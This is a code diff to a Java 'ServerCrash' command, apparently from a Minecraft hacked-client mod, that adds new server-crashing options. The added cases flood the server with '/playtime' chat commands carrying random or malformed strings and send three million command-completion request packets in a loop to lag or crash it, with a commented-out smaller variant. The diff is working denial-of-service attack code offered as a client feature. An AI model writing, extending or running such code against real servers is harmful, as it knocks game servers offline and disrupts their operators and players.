@@ -50,7 +50,7 @@ public class ServerCrash extends Command {
     @Override
     public String[] getSuggestions(String fullCommand, String[] args) {
         if (args.length == 1) {
-            return new String[]{"rider", "book", "malformednbt", "move", "papertest", "chunkoob", "mvcrash", "stackoverflow", "playtime", "maptool", "fawe"};
+            return new String[]{"rider", "book", "malformednbt", "move", "papertest", "chunkoob", "mvcrash", "stackoverflow", "playtime", "playtimeold", "maptool", "fawe", "lag"};
         }
         if (args.length == 2) {
             return new String[]{"(power)"};
@@ -140,10 +140,31 @@ public class ServerCrash extends Command {
 
             case "playtime" -> {
                 for (int i = 0; i < 10; i++) {
+                    client.player.sendChatMessage("/playtime " + rndStr(12));
+                }
+                Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Playtime Crash");
+            }
+
+            case "playtimeold" -> {
+                for (int i = 0; i < 10; i++) {
                     client.player.sendChatMessage("/playtime %¤#\"%¤#\"%¤#\"%¤#");
                 }
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Playtime Crash");
             }
+
+            case "lag" -> {
+                for(int i = 0; i < 3000000; i++){
+                    client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/"));
+                }
+                Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Quick Lag Crash");
+            }
+
+            //case "lag2" -> {
+            //    for(int i = 0; i < 255; i++){
+            //        client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/"));
+            //    }
+            //    Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Quick Lag Crash");
+            //}
 
             case "maptool" -> {
                 int size = new IntegerArgumentParser().parse(args[1]);
